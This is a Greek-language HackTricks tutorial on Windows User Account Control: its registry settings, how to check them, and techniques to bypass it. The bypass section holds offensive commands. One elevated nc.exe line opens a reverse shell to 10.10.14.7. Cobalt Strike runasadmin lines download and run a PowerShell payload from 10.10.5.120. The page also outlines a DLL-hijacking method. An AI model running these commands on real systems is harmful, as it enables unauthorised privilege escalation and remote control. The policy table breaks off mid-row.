# UAC - Έλεγχος Λογαριασμού Χρήστη

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Έλεγχος Λογαριασμού Χρήστη (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που επιτρέπει μια **προτροπή συγκατάθεσης για υψηλές δραστηριότητες**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `ακεραιότητας`, και ένα πρόγραμμα με ένα **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα υπό το πλαίσιο ασφαλείας ενός λογαριασμού μη διαχειριστή εκτός αν ένας διαχειριστής εξουσιοδοτεί ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση σε επίπεδο διαχειριστή στο σύστημα για να εκτελεστούν. Είναι μια λειτουργία άνεσης που προστατεύει τους διαχειριστές από μη επιθυμητες αλλαγές αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα ακεραιότητας:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Όταν το UAC είναι σε ισχύ, ένας χρήστης διαχειριστής λαμβάνει 2 διακριτικά: ένα κλειδί χρήστη προτύπου, για να εκτελέσει κανονικές ενέργειες σε κανονικό επίπεδο, και ένα με τα δικαιώματα διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) συζητά πώς λειτουργεί το UAC με μεγάλη βάθος και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να διαμορφώσουν πώς λειτουργεί το UAC συγκεκριμένα για τον οργανισμό τους στο τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc), ή να το διαμορφώσουν και να το εφαρμόσουν μέσω των αντικειμένων πολιτικής ομάδων (GPO) σε ένα περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις συζητούνται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις πολιτικής ομάδας που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Ρύθμιση Πολιτικής Ομάδας                                                                                                                                                                                                                                                                                                                                                           | Κλειδί Μητρώου                | Προεπιλεγμένη Ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Έλεγχος Λογαριασμού Χρήστη: Λειτουργία Έγκρισης Διαχειριστή για τον ενσωματωμένο λογαριασμό Διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Απενεργοποιημένο                                                     |
| [Έλεγχος Λογαριασμού Χρήστη: Επιτροπή σε εφαρμογές UIAccess να ζητούν έγκριση για ανύψωση χωρίς χρήση της ασφαλούς επιφάνειας εργασίας](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Απενεργοποιημένο                                                     |
| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για διαχειριστές σε Λειτουργία Έγκρισης Διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Προτροπή για συγκατάθεση για μη-Windows δυαδικά                  |
| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για τυπικούς χρήστες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Προτροπή για διαπιστευτήρια στην ασφαλή επιφάνεια εργασίας     |
| [Έλεγχος Λογαριασμού Χρήστη: Ανίχνευση εγκατάστασης εφαρμογών και προτροπή για ανύψωση](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ενεργοποιημένο (προεπιλογή για οικιακή χρήση) Απενεργοποιημένο (προεπιλογή για επιχειρησιακή χρήση) |
| [Έλεγχος Λογαριασμού Χρήστη: Ανίχνευση μόνο εκτελέσιμων που είναι υπογεγραμμένα και επικυρωμένα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Απενεργοποιημένο                                                     |
| [Έλεγχος Λογαριασμού Χρήστη: Ανίχνευση μόνο εφαρμογών UIAccess που είναι εγκατεστημένες σε ασφαλείς τοποθεσίες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ενεργοποιημένο                                                      |
| [Έλεγχος Λογαριασμού Χρήστη: Εκτέλεση όλων των διαχειριστών σε Λειτουργία Έγκρισης Διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ενεργοποιημένο                                                      |
| [Έλεγχος Λογαριασμού Χρήστη: Μετάβαση στην ασφαλή επιφά
### Θεωρία Διαβίβασης UAC

Κάποια προγράμματα **αναβαθμίζονται αυτόματα** εάν ο **χρήστης ανήκει** στη **ομάδα διαχειριστών**. Αυτά τα δυαδικά αρχεία έχουν μέσα στα _**Αρχεία Μεταδεδομένων (Manifests)**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Το δυαδικό αρχείο πρέπει επίσης να είναι **υπογεγραμμένο από τη Microsoft**.

Έπειτα, για να **παρακάμψετε** το **UAC** (αναβαθμίστε από το **μέτριο** επίπεδο ακεραιότητας σε **υψηλό**) κάποιοι επιτιθέμενοι χρησιμοποιούν αυτού του είδους τα δυαδικά αρχεία για να **εκτελέσουν αυθαίρετο κώδικα** επειδή θα εκτελεστεί από ένα **διεργασία με υψηλό επίπεδο ακεραιότητας**.

Μπορείτε να **ελέγξετε** το _**Αρχείο Μεταδεδομένων (Manifest)**_ ενός δυαδικού χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από τα Sysinternals. Και μπορείτε να **δείτε** το **επίπεδο ακεραιότητας** των διεργασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (των Sysinternals).

### Έλεγχος UAC

Για να επιβεβαιώσετε εάν το UAC είναι ενεργοποιημένο, κάντε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`** τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή **δεν υπάρχει**, τότε το UAC είναι **ανενεργό**.

Στη συνέχεια, ελέγξτε **ποιο επίπεδο** είναι ρυθμισμένο:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Εάν **`0`** τότε, το UAC δεν θα ζητήσει επιβεβαίωση (όπως **απενεργοποιημένο**)
* Εάν **`1`** ο διαχειριστής θα **ζητηθεί να εισάγει όνομα χρήστη και κωδικό πρόσβασης** για να εκτελέσει το δυαδικό με υψηλά δικαιώματα (στην Ασφαλή Επιφάνεια)
* Εάν **`2`** (**Πάντα να με ειδοποιεί**) το UAC θα ζητά πάντα επιβεβαίωση από τον διαχειριστή όταν προσπαθεί να εκτελέσει κάτι με υψηλά δικαιώματα (στην Ασφαλή Επιφάνεια)
* Εάν **`3`** όπως `1` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια
* Εάν **`4`** όπως `2` αλλά δεν είναι απαραίτητο στην Ασφαλή Επιφάνεια
* Εάν **`5`** (**προεπιλογή**) θα ζητήσει από τον διαχειριστή επιβεβαίωση για την εκτέλεση μη Windows δυαδικών με υψηλά δικαιώματα

Στη συνέχεια, πρέπει να ελέγξετε την τιμή του **`LocalAccountTokenFilterPolicy`**\
Εάν η τιμή είναι **`0`**, τότε, μόνο ο χρήστης με RID 500 (**ενσωματωμένος Διαχειριστής**) μπορεί να εκτελέσει **εργασίες διαχειριστή χωρίς UAC**, και εάν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Διαχειριστές"** μπορούν να τις εκτελέσουν.

Και, τέλος ελέγξτε την τιμή του κλειδιού **`FilterAdministratorToken`**\
Εάν **`0`**(προεπιλογή), ο **ενσωματωμένος Διαχειριστής λογαριασμός μπορεί** να εκτελέσει εργασίες απομακρυσμένης διαχείρισης και εάν **`1`** ο ενσωματωμένος λογαριασμός Διαχειριστής **δεν μπορεί** να εκτελέσει εργασίες απομακρυσμένης διαχείρισης, εκτός αν το `LocalAccountTokenFilterPolicy` έχει οριστεί σε `1`.

#### Σύνοψη

* Εάν `EnableLUA=0` ή **δεν υπάρχει**, **κανένα UAC για κανέναν**
* Εάν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=1`, Κανένα UAC για κανέναν**
* Εάν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=0`, Κανένα UAC για RID 500 (Ενσωματωμένος Διαχειριστής)**
* Εάν `EnableLua=1` και **`LocalAccountTokenFilterPolicy=0` και `FilterAdministratorToken=1`, UAC για όλους**

Όλες αυτές οι πληροφορίες μπορούν να συγκεντρωθούν χρησιμοποιώντας το **module metasploit**: `post/windows/gather/win_privs`

Μπορείτε επίσης να ελέγξετε τις ομάδες του χρήστη σας και να λάβετε το επίπεδο ακεραιότητας:
```
net user %username%
whoami /groups | findstr Level
```
## Παράκαμψη UAC

{% hint style="info" %}
Σημείωση ότι αν έχετε γραφική πρόσβαση στο θύμα, η παράκαμψη UAC είναι απλή καθώς μπορείτε απλά να κάνετε κλικ στο "Ναι" όταν εμφανιστεί το παράθυρο UAC.
{% endhint %}

Η παράκαμψη UAC είναι απαραίτητη στην ακόλουθη κατάσταση: **το UAC είναι ενεργοποιημένο, η διαδικασία σας τρέχει σε πλαίσιο με μεσαία εμπιστοσύνη και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.

Είναι σημαντικό να αναφερθεί ότι **είναι πολύ πιο δύσκολο να παρακάμψετε το UAC αν βρίσκεται στο υψηλότερο επίπεδο ασφαλείας (Πάντα) από ό,τι αν βρίσκεται σε οποιοδήποτε άλλο επίπεδο (Προεπιλογή).**

### Απενεργοποιημένο UAC

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**) μπορείτε να **εκτελέσετε ένα αντίστροφο κέλυφος με δικαιώματα διαχειριστή** (υψηλό επίπεδο εμπιστοσύνης) χρησιμοποιώντας κάτι σαν:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Παράκαμψη UAC με αντιγραφή δικαιώματος

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασική "παράκαμψη" UAC (πλήρης πρόσβαση στο σύστημα αρχείων)

Αν έχετε ένα κέλυφος με έναν χρήστη που βρίσκεται μέσα στην ομάδα Διαχειριστών, μπορείτε να **τοποθετήσετε το C$** κοινόχρηστο μέσω SMB (σύστημα αρχείων) τοπικά σε ένα νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο σύστημα αρχείων** (ακόμα και στο φάκελο του Διαχειριστή).

{% hint style="warning" %}
**Φαίνεται ότι αυτό το κόλπο δεν λειτουργεί πλέον**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Παράκαμψη UAC με το Cobalt Strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο εάν το UAC δεν έχει οριστεί στο μέγιστο επίπεδο ασφαλείας του.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Το Empire** και το **Metasploit** έχουν επίσης αρκετά modules για το **παράκαμψη** του **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Εκμετάλλευση παράκαμψης UAC

[**UACME**](https://github.com/hfiref0x/UACME) το οποίο είναι μια **συλλογή** από διάφορες εκμεταλλεύσεις παράκαμψης UAC. Σημειώστε ότι θα χρειαστεί να **μεταγλωτίσετε το UACME χρησιμοποιώντας το visual studio ή το msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`), θα πρέπει να ξέρετε **ποιο χρειάζεστε.**\
Θα πρέπει **να είστε προσεκτικοί** επειδή μερικές παρακάμψεις θα **ενεργοποιήσουν άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME έχει τη **έκδοση build από την οποία ξεκίνησε να λειτουργεί κάθε τεχνική**. Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### Περισσότερες παρακάμψεις UAC

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για την παράκαμψη του UAC **απαιτούν** ένα **πλήρες διαδραστικό κέλυφος** με το θύμα (ένα κοινό κέλυφος nc.exe δεν είναι αρκετό).

Μπορείτε να το πετύχετε χρησιμοποιώντας μια συνεδρία **meterpreter**. Μεταναστεύστε σε ένα **διεργασία** που έχει την τιμή **Session** ίση με **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ πρέπει να λειτουργεί)

### Παράκαμψη UAC με GUI

Αν έχετε πρόσβαση σε ένα **GUI μπορείτε απλά να αποδεχτείτε την πρόταση UAC** όταν τη λάβετε, δεν χρειάζεται πραγματικά μια παράκαμψη. Έτσι, η πρόσβαση σε ένα GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια συνεδρία GUI που κάποιος χρησιμοποιούσε (πιθανώς μέσω RDP) υπάρχουν **κάποια εργαλεία που θα εκτελούνται ως διαχειριστής** από όπου θα μπορούσατε να **εκτελέσετε** ένα **cmd** για παράδειγμα **ως διαχειριστής** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC όπως στο [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **αόρατο**.

### Θορυβώδης παράκαμψη UAC με βία

Αν δεν σας ενδιαφέρει να είστε θορυβώδεις μπορείτε πάντα να **εκτελέσετε κάτι σαν** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να αναβαθμίσει δικαιώματα μέχρι ο χρήστης να το αποδεχτεί**.

### Η δική σας παράκαμψη - Βασική μεθοδολογία παράκαμψης UAC

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι **η πλειοψηφία των παρακαμψεων UAC καταχρώνται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Διαβάστε αυτό για να μάθετε πώς να βρείτε μια ευπάθεια Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Βρείτε ένα δυαδικό που θα **αυτοαναβαθμίζεται** (ελέγξτε όταν εκτελείται ότι τρέχει σε υψηλό επίπεδο ακεραιότητας).
2. Με το procmon βρείτε τα γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα στο **DLL Hijacking**.
3. Πιθανώς θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποια **προστατευμένα μονοπάτια** (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός αρχείου CAB μέσα σε προστατευμένα μονοπάτια (επειδή αυτό το εργαλείο εκτελείται από υψηλό επίπεδο ακεραιότητας).
2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **σενάριο** για να αντιγράψετε το DLL σας μέσα στο προστατευμένο μονοπάτι και να εκτελέσετε το ευάλωτο και αυτοαναβαθμισμένο δυαδικό.

### Άλλη τεχνική παράκαμψης UAC

Αποτελείται από το να παρακολουθείτε αν ένα **αυτοαναβαθμιζόμενο δυαδικό** προσπαθεί να **διαβάσει** από το **μητρώο** το **όνομα/μονοπάτι** ενός **δυαδικού** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το δυαδικό αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
